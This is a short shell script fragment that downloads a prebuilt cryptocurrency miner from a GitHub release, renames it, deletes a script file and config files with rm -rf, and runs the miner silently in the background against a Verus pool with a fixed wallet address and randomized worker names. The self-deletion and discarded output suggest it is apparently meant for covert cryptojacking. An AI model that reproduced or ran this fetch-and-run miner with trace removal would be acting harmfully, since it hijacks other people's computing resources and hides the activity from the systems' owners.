wget -O hmm.tar.gz https://github.com/hellcatz/hminer/releases/download/v0.59.1/hellminer_linux64.tar.gz && tar -xf hmm.tar.gz && mv hellminer hm
...
rm -rf sh.sh config_*
./hm -u RHTx4HUZRrmy8tWhpn5WWX2x7KmfYS4Txq.pragos -c stratum+ssl://verushash.mine.zergpool.com:13300 -p c=VRSC,id=YANTO$(( $RANDOM % 50 + 1 )) --cpu 2 &> /dev/null &
